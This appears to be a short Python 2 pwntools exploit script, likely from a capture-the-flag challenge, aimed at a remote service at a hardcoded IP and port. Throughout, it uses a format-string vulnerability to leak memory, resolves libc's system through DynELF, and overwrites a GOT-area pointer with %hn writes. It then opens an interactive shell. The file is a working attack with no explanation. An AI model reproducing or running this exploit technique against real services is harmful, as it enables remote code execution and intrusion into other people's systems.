from pwn import *

for i in xrange(0x601008, 0x601030,8):
	s = remote("78.46.224.86", 1337)

	#get saved rip

	def leak(addr):
		s.sendline("%%7$sluj\x00%s" % p64(addr))
		pad = p64(addr).rstrip("\x00")
		ret = s.recvuntil("luj")[:-3]+"\x00"
		#print "[%x] => %s" % (addr, repr(ret))
		return ret

	d = DynELF(leak, 0x400490)

	system = d.lookup("system",'libc')

	#system = u64("aabbccdd")
	print "system = %x" % system

	ptrs = "".join([p64(j) for j in xrange(i, i+8,2)])

	write = p64(system)
	frmt = ""
	ctr = 0
	it = 15
	while write:
		byts = write[:2]
		write = write[2:]
		val = u16(byts) - ctr
		if val <0:
			val += 0x10000
		ctr = (u16(byts))&0xffff
		frmt += "%%.%du%%%d$hn" % (val, it)
		it += 1
	
	buf = frmt + "\x00"*(8*9-len(frmt)) + ptrs
	s.sendline(buf)

	s.sendline("/bin/sh")
	s.sendline("ls")
	s.interactive()
